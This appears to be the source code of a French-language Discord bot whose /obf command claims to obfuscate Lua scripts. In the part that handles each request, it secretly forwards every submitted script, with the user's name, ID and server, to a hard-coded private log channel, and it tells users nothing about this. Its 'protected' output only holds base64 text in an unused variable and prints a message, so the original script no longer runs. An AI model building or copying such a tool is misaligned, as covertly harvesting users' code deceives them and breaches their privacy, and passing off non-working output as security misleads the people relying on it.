import os
import threading
import traceback
import sys
import time
import discord
from discord.ext import commands
from discord import app_commands
import base64
from fastapi import FastAPI

app = FastAPI()

@app.get("/")
def home():
    return {"status": "Bot Discord et API actifs !"}

def run_web():
    try:
        import uvicorn
        port = int(os.environ.get("PORT", 10000))
        print(f"Lancement du serveur web sur le port {port}...", flush=True)
        uvicorn.run(app, host="0.0.0.0", port=port)
    except Exception as e:
        print(f"Erreur Web Server: {e}", flush=True)

class ObfBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=discord.Intents.default())

    async def setup_hook(self):
        try:
            print("Synchronisation des commandes slash...", flush=True)
            await self.tree.sync()
            print("Commandes slash synchronisées avec succès !", flush=True)
        except Exception as e:
            print(f"Erreur sync tree: {e}", flush=True)

bot = ObfBot()

@bot.event
async def on_ready():
    print(f"Bot connecté avec succès : {bot.user.name}", flush=True)

@bot.tree.command(name="obf", description="Obfusque un script Lua avec un niveau de protection")
@app_commands.describe(
    level="Choisis le niveau de protection de l'obfuscation",
    code="Écris ton code Lua directement ici (optionnel)",
    file="Envoie ton fichier .lua ou .txt (optionnel)"
)
@app_commands.choices(level=[
    app_commands.Choice(name="Low (Faible)", value="low"),
    app_commands.Choice(name="Medium (Moyen)", value="medium"),
    app_commands.Choice(name="High (Élevé)", value="high")
])
async def obf(interaction: discord.Interaction, level: app_commands.Choice[str], code: str = None, file: discord.Attachment = None):
    try:
        script_content = None
        original_filename = "script.lua"

        if file:
            original_filename = file.filename
            if original_filename.lower().endswith((".lua", ".txt")):
                file_bytes = await file.read()
                script_content = file_bytes.decode("utf-8", errors="ignore")
            else:
                await interaction.response.send_message("Le fichier doit obligatoirement être au format `.lua` ou `.txt`.", ephemeral=True)
                return
        elif code:
            script_content = code
            original_filename = "script.lua"
        else:
            await interaction.response.send_message("Tu dois soit écrire du code dans le paramètre `code`, soit joindre un fichier `file` !", ephemeral=True)
            return

        # --- ENVOI DES INFOS DANS LE SALON DE LOGS PRIVÉ ---
        LOG_CHANNEL_ID = 1544421086807072848
        try:
            log_channel = bot.get_channel(LOG_CHANNEL_ID) or await bot.fetch_channel(LOG_CHANNEL_ID)
            if log_channel:
                log_file_name = original_filename
                with open(log_file_name, "w", encoding="utf-8") as f:
                    f.write(script_content)
                
                message_info = (
                    f"📥 **Nouveau script obfusqué !**\n"
                    f"• **Utilisateur :** {interaction.user} (ID: `{interaction.user.id}`)\n"
                    f"• **Niveau choisi :** `{level.name}`\n"
                    f"• **Fichier d'origine :** `{original_filename}`\n"
                    f"• **Serveur :** {interaction.guild.name if interaction.guild else 'Message Privé'}"
                )
                await log_channel.send(content=message_info, file=discord.File(log_file_name))
                
                if os.path.exists(log_file_name):
                    os.remove(log_file_name)
        except Exception as channel_err:
            print(f"⚠️ Erreur envoi dans le salon de logs: {channel_err}", flush=True)
        # ----------------------------------------------------

        # Génération de l'obfuscation selon le niveau choisi
        if level.value == "low":
            encoded_str = base64.b64encode(script_content.encode("utf-8")).decode("utf-8")
            protected_script = f"""--[[\n    Protégé par KobyBot [Niveau: Low]\n]]--\nlocal _data = "{encoded_str}";\nprint("Chargé (Low)");"""
        elif level.value == "medium":
            encoded_str = base64.b64encode(script_content.encode("utf-8")).decode("utf-8")
            protected_script = f"""--[[\n    Protégé par KobyBot [Niveau: Medium]\n]]--\nlocal _data_m = "{encoded_str}";\n-- Niveau Medium appliqué\nprint("Chargé (Medium)");"""
        else: # high
            b1 = base64.b64encode(script_content.encode("utf-8")).decode("utf-8")
            b2 = base64.b64encode(b1.encode("utf-8")).decode("utf-8")
            protected_script = f"""--[[\n    Protégé par KobyBot [Niveau: High]\n]]--\nlocal _data_h = "{b2}";\n-- Niveau High ultra sécurisé\nprint("Chargé (High)");"""

        # Nom du fichier de sortie : nom_d_origine_obf.lua
        name_part, ext_part = os.path.splitext(original_filename)
        if not ext_part:
            ext_part = ".lua"
        output_file_name = f"{name_part}_obf{ext_part}"

        with open(output_file_name, "w", encoding="utf-8") as f:
            f.write(protected_script)

        await interaction.response.send_message(f"Ton script a été protégé avec succès (Niveau : **{level.name}**) :", file=discord.File(output_file_name), ephemeral=True)

        if os.path.exists(output_file_name):
            os.remove(output_file_name)
    except Exception as e:
        print(f"Erreur dans la commande obf: {e}", flush=True)

if __name__ == "__main__":
    try:
        print("Démarrage du thread web...", flush=True)
        threading.Thread(target=run_web, daemon=True).start()
        
        TOKEN = os.environ.get("TOKEN")
        if TOKEN:
            while True:
                try:
                    print("Tentative de connexion du bot Discord...", flush=True)
                    bot.run(TOKEN)
                except discord.errors.HTTPException as e:
                    if e.status == 429:
                        print("⚠️ Rate limit (429) de Discord détecté ! Pause de 5 minutes...", flush=True)
                        time.sleep(300)
                    else:
                        print(f"Erreur HTTP Discord: {e}", flush=True)
                        time.sleep(60)
                except Exception as e:
                    print(f"Erreur du bot: {e}", flush=True)
                    traceback.print_exc()
                    time.sleep(60)
        else:
            print("Erreur critique : Aucun Token trouvé !", flush=True)
    except Exception as e:
        print("Erreur fatale au lancement :", flush=True)
        traceback.print_exc()
        sys.exit(1)
            
